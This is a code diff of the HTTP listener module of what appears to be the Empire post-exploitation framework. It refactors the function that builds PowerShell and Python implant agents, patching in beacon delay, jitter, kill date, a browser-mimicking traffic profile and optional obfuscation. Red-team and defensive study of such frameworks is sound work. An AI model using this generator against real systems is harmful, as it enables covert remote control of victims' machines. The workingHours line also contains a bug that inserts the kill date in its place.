@@ -641,7 +641,6 @@ class Listener:
         else:
             print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
 
-
     def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
         """
         Generate the full agent code needed for communications with this listener.
@@ -658,6 +657,7 @@ class Listener:
         lostLimit = listenerOptions['DefaultLostLimit']['Value']
         killDate = listenerOptions['KillDate']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
+        cookie = listenerOptions['Cookie']['Value']
         b64DefaultResponse = base64.b64encode(self.default_response())
 
         if language == 'powershell':
@@ -666,29 +666,25 @@ class Listener:
             code = f.read()
             f.close()
 
-            cookies = helpers.get_listener_cookies()
+            # patch in the comms methods
+            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language, cookie=cookie)
+            code = code.replace('REPLACE_COMMS', commsCode)
 
-            for cookie in cookies:
-                # patch in the comms methods
-                commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language, cookie=cookie)
-                code = code.replace('REPLACE_COMMS', commsCode)
+            # strip out comments and blank lines
+            code = helpers.strip_powershell_comments(code)
 
-                # strip out comments and blank lines
-                code = helpers.strip_powershell_comments(code)
+            # patch in the delay, jitter, lost limit, and comms profile
+            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
+            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
+            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
+            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
+            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')
 
-                # patch in the delay, jitter, lost limit, and comms profile
-                code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
-                code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
-                code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
-                code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
-                code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')
-
-                # patch in the killDate and workingHours if they're specified
-                if killDate != "":
-                    code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
-                if obfuscate:
-                    code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
-            
+            # patch in the killDate and workingHours if they're specified
+            if killDate != "":
+                code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
+            if obfuscate:
+                code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
             return code
 
         elif language == 'python':
@@ -696,34 +692,30 @@ class Listener:
             code = f.read()
             f.close()
 
-            cookies = helpers.get_listener_cookies()
+            # patch in the comms methods
+            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language, cookie=cookie)
+            code = code.replace('REPLACE_COMMS', commsCode)
 
-            for cookie in cookies:
-                # patch in the comms methods
-                commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language, cookie=cookie)
-                code = code.replace('REPLACE_COMMS', commsCode)
+            # strip out comments and blank lines
+            code = helpers.strip_python_comments(code)
 
-                # strip out comments and blank lines
-                code = helpers.strip_python_comments(code)
+            # patch in the delay, jitter, lost limit, and comms profile
+            code = code.replace('delay = 60', 'delay = %s' % (delay))
+            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
+            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
+            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
+            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))
 
-                # patch in the delay, jitter, lost limit, and comms profile
-                code = code.replace('delay = 60', 'delay = %s' % (delay))
-                code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
-                code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
-                code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
-                code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))
-
-                # patch in the killDate and workingHours if they're specified
-                if killDate != "":
-                    code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
-                if workingHours != "":
-                    code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))
+            # patch in the killDate and workingHours if they're specified
+            if killDate != "":
+                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
+            if workingHours != "":
+                code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))
 
             return code
         else:
             print helpers.color("[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
-
-
+            
     def generate_comms(self, listenerOptions, language=None, cookie=''):
         """
         Generate just the agent communication code block needed for communications with this listener.
